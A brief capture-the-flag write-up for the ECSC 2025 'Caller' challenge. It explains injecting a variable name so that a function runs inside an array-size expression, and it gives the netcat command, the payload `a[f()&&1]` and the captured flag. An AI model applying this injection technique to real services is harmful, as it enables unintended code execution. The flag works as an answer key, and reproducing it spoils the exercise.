# Caller

We are allowed to inject a variable name, so we can execute execute `f` function while defining the array size. Then make AND operation to avoid error since `f` returns `char*`:
```bash
nc caller.ecsc25.hack.cert.pl 5212
a[f()&&1]
# ecsc25{thats_some_weird_variable_name}
```